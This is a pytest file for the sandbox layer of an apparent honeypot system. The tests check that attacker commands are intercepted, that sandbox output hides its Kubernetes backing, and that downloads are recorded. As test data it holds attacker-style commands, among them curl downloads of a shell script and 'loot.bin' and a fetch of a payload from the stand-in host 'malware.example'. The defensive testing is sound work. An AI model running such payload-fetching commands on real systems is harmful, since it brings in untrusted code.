"""Phase-1 sandbox intercept tests."""

from __future__ import annotations

from pathlib import Path

from deception.command_engine.engine import execute
from deception.runtime.host import Session, VirtualHost
from deception.runtime.sandbox import (
    MockSandboxClient,
    sanitize_sandbox_output,
    should_sandbox,
)
from rag.ingest import build_corpus

ROOT = Path(__file__).resolve().parents[2]
HOST = ROOT / "deception" / "hosts" / "enterprise-web.yml"


def _session() -> Session:
    return Session(host=VirtualHost.load(HOST), session_id="sb", actor_id="actor-sb-test")


def test_should_sandbox_external_curl() -> None:
    assert should_sandbox("curl -o tool https://github.com/foo/bar/raw/main/x.sh")
    assert not should_sandbox("curl -I http://127.0.0.1/")
    assert not should_sandbox("curl http://192.168.30.40/")


def test_sanitize_hides_k8s() -> None:
    raw = "Error in kubernetes pod/netosis-sandbox namespace at 192.168.40.31:8000\n"
    clean = sanitize_sandbox_output(raw)
    assert "k8s" not in clean.lower() or "process" in clean.lower()
    assert "8000" not in clean or "localhost" in clean


def test_curl_external_writes_file_and_rag() -> None:
    s = _session()
    r = execute(s, "curl -o loot.bin https://example.com/loot.bin")
    assert r.exit_code == 0
    assert "/home/admin/loot.bin" in s.host.filesystem
    assert s.sandbox_jobs
    assert s.sandbox_jobs[-1]["classification"] == "utility"
    docs = build_corpus(s)
    assert any(d.doc_id.startswith("actor.sandbox:") for d in docs)
    assert "loot.bin" in (s.host.filesystem["/home/admin/loot.bin"].get("content") or "")


def test_malware_ip_contained() -> None:
    s = _session()
    client = MockSandboxClient(malware_hosts={"malware.example"})
    result = client.run(s, "curl https://malware.example/payload")
    assert result.contained is True
    assert result.classification == "malware"
    assert result.exit_code != 0
    assert "timed out" in result.stdout.lower() or "failed" in result.stdout.lower()


def test_git_clone_creates_repo() -> None:
    s = _session()
    r = execute(s, "git clone https://github.com/example/recon-tools.git")
    assert r.exit_code == 0
    assert "/home/admin/recon-tools/README.md" in s.host.filesystem
    cat = execute(s, "cat recon-tools/README.md")
    assert "recon-tools" in cat.stdout or "Cloned" in cat.stdout
